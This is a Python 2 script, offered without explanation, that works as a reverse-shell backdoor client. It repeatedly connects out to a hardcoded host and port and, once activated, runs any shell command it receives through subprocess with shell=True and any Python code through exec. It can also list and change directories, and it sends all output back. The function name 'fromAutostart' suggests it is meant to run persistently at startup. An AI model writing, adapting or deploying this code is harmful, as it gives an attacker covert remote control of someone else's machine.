# -*- coding: utf-8 -*-
#!/usr/bin/python

import socket
import time
import os
import subprocess

HOST = '127.0.0.1'
PORT = 4434
active = False
printf = ''
hooked = {}
loggingState = False
passKey = r''


def Send(sock, cmd, end="[ENDOFMESSAGE]"):
    sock.sendall((cmd + end).encode('utf-8'))


def Receive(sock, end="[ENDOFMESSAGE]"):
    data = ""
    l = sock.recv(1024)
    while l:
        data = data + l
        if data.endswith(end):
            break
        else:
            l = sock.recv(1024)
    return data[:-len(end)].decode('utf-8')

def Execute(source):
    try:
        exec source
        if printf == '':
            return 'No output<br>example: printf = "SOME TEXT OR VARIABLE"'
        return str(printf)
    except Exception as e:
        return str(e)


def Exec(cmde):
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
            return cmdoutput
        except Exception as e:
            return '<font color="red">SERVER ERROR: </font>' + str(e)

    else:
        return "Enter a command.\n"

def fromAutostart():
    global active
    global passKey
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            data = Receive(s)
            if data == 'Activate':
                active = True
                Send(s, '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>')

            while active:
                data = Receive(s)
                if data == '':
                    time.sleep(0.02)
                if data == "quit" or data == "terminate":
                    print 'terminated'
                    Send(s, "quitted")
                    active = False
                    break
                elif data.startswith("cd "):
                    try:
                        os.chdir(data[3:])
                        stdoutput = ""
                    except:
                        stdoutput = "Error opening directory.\n"
                elif data.startswith(("Activate")):
                    stdoutput = ''
                elif data.startswith("runscript"):
                    stdoutput = Execute(data[10:])
                elif data.startswith("ls"):
                    string = {}
                    try:
                        for n, i in enumerate(os.listdir(u'.')):
                            string[n] = {}
                            string[n]['name'] = i
                            string[n]['type'] = os.path.isfile(i)
                        stdoutput = str(string)
                    except WindowsError:
                        stdoutput = 'Access is denied'
                else:
                    stdoutput = Exec(data)
                stdoutput = '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>\n\n'+stdoutput
                Send(s, stdoutput)
            if data == "terminate":
                break
            time.sleep(3)
        except socket.error:
            s.close()
            active = False
            time.sleep(10)
            continue


fromAutostart()